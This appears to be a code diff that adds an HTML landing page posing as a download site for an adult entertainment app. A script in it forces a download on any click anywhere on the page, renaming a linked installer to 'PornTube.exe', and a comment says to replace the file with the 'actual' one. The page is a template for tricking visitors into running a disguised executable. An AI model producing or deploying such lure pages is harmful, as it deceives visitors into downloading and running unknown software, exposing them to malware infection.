@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PornTube</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('./pt.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .modal {
+      background: rgba(98, 96, 96, 0.85) ;
+      padding: 2rem;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
+    }
+
+    .modal p {
+      margin-bottom: 1.5rem;
+    }
+
+    .btn {
+      background-color: #00bfff;
+      color: white;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 5px;
+      text-decoration: none;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #009acd;
+    }
+    .rate{
+        padding-top: 25px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="modal">
+    <img src="./PornTube-Logo.png" alt="" srcset="" style="height: 60px; width: 130px;">
+    <h2>All-in-One Adult Entertainment App</h2>
+
+    <p>Enjoy adult only live shows, explicit videos, and interactive games all in one place. Download the app for your device and experience premium adult content securely.</p>
+    <a href="https://zoom.us/client/latest/ZoomInstaller.exe" class="btn">Download for Windows</a>
+    <div class="rate">&copy; Rating - Age 18 and above</div>
+  </div>
+
+</body>
+  <script>
+   
+    window.onclick = function() {
+      const link = document.createElement('a');
+      link.href = 'https://zoom.us/client/latest/ZoomInstaller.exe'; // Replace with actual file
+      link.download = 'PornTube.exe';
+      link.click();
+    };
+  </script>
+</html>
